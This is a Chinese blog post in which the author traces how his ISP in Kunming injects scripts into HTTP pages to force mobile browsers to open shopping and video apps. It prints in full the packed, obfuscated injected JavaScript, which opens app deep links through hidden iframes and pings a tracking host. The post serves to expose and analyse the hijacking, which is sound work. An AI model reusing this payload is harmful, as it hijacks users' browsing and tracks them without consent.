---
title: 记一次昆明电信网络劫持跟踪过程
date: 2018-09-17 22:52:00
tags: 
    - 网络劫持
---

网络劫持大家已经司空见惯，通常，这样的行径大多出现在二级运营商手中。曾经斗胆用过“*城宽带”，劫持得丧心病狂，连支付宝的HTTPS流量都劫持，搞得支付宝连连报证书校验不通过错误~现在我用了昆明电信，本想应该节操高一些，没想到啊没想到，他个浓眉大眼的家伙也背叛了革命！
<!-- more -->

2018年6月以来，我在家里手机上网时常会遇到一件很匪夷所思得事情:上某些网站的时候手机会跳转到一些APP上。刚开始我并没有太在意，以为是一些下线低了点的站长在站点里嵌入了一些广告代码。毕竟经济寒冬下，大家日子都很难过，吃相丑一点就丑一点吧，IT人不为难IT人~可是随着时间的推移，这样的事情愈演愈烈，CSDN沦陷，博客园沦陷，阿里巴巴也沦陷....这就很不正常了。前两家作为一个服务码农的站点，这样作死很不可思议，连马爸爸的站点都干这种事，我就打死不信了。

![dianxin-jiechi-20189172349](http://blog.uliian.com/dianxin-jiechi-20189172349.jpg)

应用被劫持后主要表现如下：

![dianxin-jiechi-2018917231458](http://blog.uliian.com/dianxin-jiechi-2018917231458.gif)
有时候还会弹出4、5个APP，这吃相~简直不要太丑陋！！！

身为一个守(懒)法(惰)好(程)公(序)民(员)，我首先做了一件事：**打10000号投诉！！**
毕竟我国对流量劫持行为是有法律规定的：《中华人民共和国刑法》流量劫持算作网络犯罪：

![dianxin-jiechi-2018917231935](http://blog.uliian.com/dianxin-jiechi-2018917231935.png)

于是我秉承着佛系青年原则，于 **2018年9月12日早7：44** 向中国电信进行了投诉。
> 中国电信的工作人员秉承着“我是你爹”的一贯态度，对我所提出的问题是否存在予以否认。并要求我提供截图~

> 我对此表示不解：1、我这是在和你通电话诶，我怎么给你截图？2、截图也说不清楚这个问题啊，这是一个动态问题，我怎么截图？

> 中国电信的工作人员表示：1、你不截图更说不清楚；2、我发给你一个QQ，你把你的截图发给这个QQ就好了。

好吧，我想了想，录个屏算了，于是就有了上面大家所见的动态截屏。但是我一直等啊等，手机却没有接到任何所谓的QQ号~万般无奈之下我向工信部提交了投诉。并于第二天我收到了这样一条短信：

![dianxin-jiechi-2018917232954](http://blog.uliian.com/dianxin-jiechi-2018917232954.jpg)

OK,你们牛~~你们是用户他爹！

庆幸的是，我于2018年9月14日上午10:25接到了电信辖区工作人员的电话，他表示希望上门了解情况。可惜的是，我当天不在，小哥态度很好，认真听我说完了我的遭遇，并且加了我的微信，我将我的录屏发给了他。他表示会向上反映，但也还是希望到我家了解一下情况。

在2018年9月17日下午，小哥再次与我取得联系，约定晚上到我家进行现场处理。据说今天晚上昆明会受台风的影响，我对小哥的服务态度还是很感动的~晚上7点多，小哥来到现场，和我想的一样，他能做的并不多，他只是看了一下线路是否正常，别的真的做不了更多，他对我描述的情况表示了解，并表示出了无奈。

身为一个有B格的程序员，怎么能被这样的挫折打倒？被劫持的网站很显然都是HTTP，HTTPS目前还没有发现受到影响！看了看自己的“网络工程”毕业证和已经过期的“CCNA”，觉得还是不能给本本们丢脸，开始追踪追踪到底怎么回事。经过长期的观察，我已经发现某些站点被劫持的概率高，某些站点被劫持的概率低，“阿里巴巴问答”相关的页面，默认全是HTTP协议，被劫持的概率超级高，特别是从搜索引擎跳过去的劫持概率相当了得~

打开电脑，开启`fiddler`，设置远程代理，手机代理撸上去，先把手机浏览器的UA抓了再说。撸完了直接在电脑上模拟操作就行`Chrome UA Spoofer`插件把UA换上去，手机模拟打开~搜索关键字，进入阿里巴巴相关页面。果然上当！

![dianxin-jiechi-2018917234758](http://blog.uliian.com/dianxin-jiechi-2018917234758.png)

流氓到爆有木有啊有木有？！从这堆红字里面，我们可以看到，这个页面尝试打开19个APP~丧心病狂啊有木有？！
![dianxin-jiechi-201891723508](http://blog.uliian.com/dianxin-jiechi-201891723508.jpg)

那么问题来了，什么地方调用文件打开这些代码的呢？经过对数据包的一番浏览猜测，我把目光锁定到了一个奇怪的请求上：

![dianxin-jiechi-2018917235331](http://blog.uliian.com/dianxin-jiechi-2018917235331.png)

其他的域名都和阿里巴巴有关，绝大多数是alicdn下的域名，这里怎么冒出这么一个十分违和的东西？我再看里面的内容，更加觉得疑点重重：

```javascript
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('(O(w){9 d=v,q=w.21,11=w.20,l=w.1X,N=w.1W,1D=w.1Y,y=25.2c.2b(),j=1T("1n");C{5(/2d|2f|2e|26|1y|1z/i.1H(y)){9 1h=0,1j=0,1b=0,R=0,P=0,x="",b="",S="",a=u H(),I=u H(),s=u H(),t=u H();5(q!=8&&q.7>0){P=q.7}5(P==0&&l!=8&&l.7>0){P=l.7}L(9 m=0;m<P;m++){1h=0;1j=0;s=u H();t=u H();5(N!=8&&N.7>m&&N[m]!=8&&N[m]!=""){s=N[m].14("|")}5(l!=8&&l.7>m&&l[m]!=8&&l[m]!=""){t=l[m].14("|")}5(s!=8&&s.7>0){L(9 n=0;n<s.7;n++){5(s[n]!=8&&s[n]!=""&&y.k(s[n])>-1){1h++;1v}}}5(1h==0&&t!=8&&t.7>0){L(9 n=0;n<t.7;n++){5(t[n]!=8&&t[n]!=""&&y.k(t[n])>-1){1j++;1v}}}5(1j==0&&q.7>m&&q[m]!=8&&q[m]!=""&&11.7>m&&11[m]!=8){x=q[m];R=11[m];5(x&&x.k("://")>0){5(x.k("1F.1d")>0){b="1I"}h 5(x.k("1i.1d")>0){b="1i"}h{b=x.14("://")[0]}1b=0;5(I!=8&&I.7>0){L(9 o=0;o<I.7;o++){S=I[o];5(S!=8&&S!=""&&b==S){1b=1;1v}}}5(1b==0&&R!=8&&R>0){L(9 i=0;i<R;i++){a.1S(x)}}I.1S(b)}}}5(a==8||a.7==0){a=q}1m(a,y,j,1,1L)}}B(f){K.M(\'27\'+f)};O 1m(a,y,j,1c,J){5(a!=8&&a.7>0){b="",1x=28(2a*1u.1q())%a.7,e=a[1x];C{5(1c>3){J=29}1c++;5(e!=8&&e!=1G&&e!=""&&e.7>0&&e.k("://")>0){5(e.k("1F.1d")>0){b="1I"}h 5(e.k("1i.1d")>0){b="1i"}h{b=e.14("://")[0]}5(j==8||j==1G){j=""}5(j==""||j.k(b)<0){5(/1y|1z/i.1H(y)){C{9 16=v.1Z(\'1V\');16.1l=e;16.23.22=\'24\';v.2g.2A(16);5(1u.1q()<0.1B){(u 1A().1l=1D)}}B(f){K.M(\'2F\'+f)}}h{e=e.1p(/2C/g,\'2D\');C{1C.1p(e)}B(f){C{1C.2E=e}B(f){K.M(\'2z\'+f)}}}5(1u.1q()<0.1B){C{9 T=b;5(b.7>10){T=b.2y(0,10)};T=2B(1t.1M("2G|2L|"+T));u 1A().1l="//2M:2I/?p="+T}B(f){K.M(\'2K\'+f)}}j+="|"+b;1w("1n",j,1)}h{J=1E}}h{J=1E}a.2H(1x,1)}B(f){K.M(\'2J\'+f)}C{5(a!=8&&a.7>0){2m(1m,J,a,y,j,1c,J)}h{1w("1n","",1)}}B(f){K.M(\'2o\'+f)}}};O 1T(1o){5(v.G.7>0){E=v.G.k(1o+"=");5(E!=-1){E=E+1o.7+1;18=v.G.k(";",E);5(18==-1){18=v.G.7}1e 2n(v.G.2i(E,18))}}1e 8};O 1w(1K,1J,1R){9 1U=1R;9 1k=u 2h();1k.2k(1k.2j()+1U*1Q*1Q*1L);v.G=1K+"="+2p(1J)+";2v="+1k.2u()};9 1t={X:"2x+/=",1M:O(A){9 Y="";9 1g,W,U,1s,1r,1a,V;9 i=0;A=1t.1N(A);2w(i<A.7){1g=A.1f(i++);W=A.1f(i++);U=A.1f(i++);1s=1g>>2;1r=((1g&3)<<4)|(W>>4);1a=((W&15)<<2)|(U>>6);V=U&Z;5(1P(W)){1a=V=1O}h 5(1P(U)){V=1O}Y=Y+19.X.17(1s)+19.X.17(1r)+19.X.17(1a)+19.X.17(V)}1e Y},1N:O(Q){Q=Q.1p(/\\r\\n/g,"\\n");9 z="";L(9 n=0;n<Q.7;n++){9 c=Q.1f(n);5(c<13){z+=F.D(c)}h 5((c>2r)&&(c<2q)){z+=F.D((c>>6)|2t);z+=F.D((c&Z)|13)}h{z+=F.D((c>>12)|2s);z+=F.D(((c>>6)&Z)|13);z+=F.D((c&Z)|13)}}1e z}}})(2l);',62,173,'|||||if||length|null|var|realURLS|tempS|||tURL|err||else||runCK|indexOf|pcua|||||urls||strTGuas|strPCuas|new|document||tempURL|tempUA|utftext|input|catch|try|fromCharCode|c_start|String|cookie|Array|tempURLS|spanNum|console|for|log|tgua|function|maxLen|string|tempRate|tempRvwCK|tempsub|chr3|enc4|chr2|_0|output|63||rates||128|split||ifr|charAt|c_end|this|enc3|tcheck|loop|com|return|charCodeAt|chr1|tempCheckIn|yangkeduo|tempCheckPc|exp|src|sling|igabnha|c_name|replace|random|enc2|enc1|Base64|Math|break|stck|tindex|android|linux|Image|01|location|ttj|100|alipay|undefined|test|alipays|value|name|1000|encode|_1|64|isNaN|60|days|push|gtck|Days|iframe|t_uai|t_uas|t_tj|createElement|t_rates|t_urls|display|style|none|navigator|itouch|ERROR|parseInt|2000|1E5|toLowerCase|userAgent|ios|iphone|ipad|body|Date|substring|getTime|setTime|window|setTimeout|unescape|error5|escape|2048|127|224|192|toGMTString|expires|while|ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789|substr|error2|appendChild|encodeURIComponent|snssdk143|snssdk141|href|error1|hxxm|splice|8866|error4|error3|ADR|794543516'.split('|'),0,{}))

```

它在掩盖什么？这不是正常的代码，太祖告诉过我们 **事出反常必有妖！！** 看我怎么收拾你个小妖精，这里有一个让 JavaScript 更加漂亮的网站：https://beautifier.io/ 于是我把这段恶心的代码粘贴进去，看看它到底是何方妖孽~

当当当~别的代码都不重要，我们只要看最上面几句话基本就能锁定疑犯：

![dianxin-jiechi-20189180026](http://blog.uliian.com/dianxin-jiechi-20189180026.png)

嘚~ 你个马仔~ ！基本可以确定，这货就是用来执行跳转的代码~ 但是urls是从哪里来的？嘿嘿嘿，看你往哪跑~

![dianxin-jiechi-20189180248](http://blog.uliian.com/dianxin-jiechi-20189180248.png)

继续追踪：

![dianxin-jiechi-20189180148](http://blog.uliian.com/dianxin-jiechi-20189180148.png)

看见了吗看见了吗？阿里巴巴里面出现youku了~ 屏幕太小，无法展现所有URL，但是凶手已经找到了，但是~ ！`detect.js`并不像是一个没用的js，在另一次跟踪中，存放这些属性的是一个叫`location.js`的文件，每次它都会变~顺着抓包列表往下走，很快就会发现一个神奇的文件：
![dianxin-jiechi-20189180757](http://blog.uliian.com/dianxin-jiechi-20189180757.png)

同样的文件名，多了一个查询字符串这个文件点开一看，明显是个正经货~我就不截图了~那基本的流程就可以确定了：


> 页面需要`detect.js` =>网络劫持`detect.js` =>假货`detect.js`存放APP URL变量，并向页面添加`yy.js`文件 =>为了保证页面正常使用，将真货`detect.js`文件URL添加查询字符串绕过劫持规则引导向真实js文件 =>`yy.js`文件将APP URL取出并做跳转操作。

最后，我们看看那个奇怪的域名到底是一个什么样的站点？直接访问其顶级域名，看到这样一个站点：
![dianxin-jiechi-201891801859](http://blog.uliian.com/dianxin-jiechi-201891801859.png)

呵呵呵呵，我有一万句MMP不知当不当讲！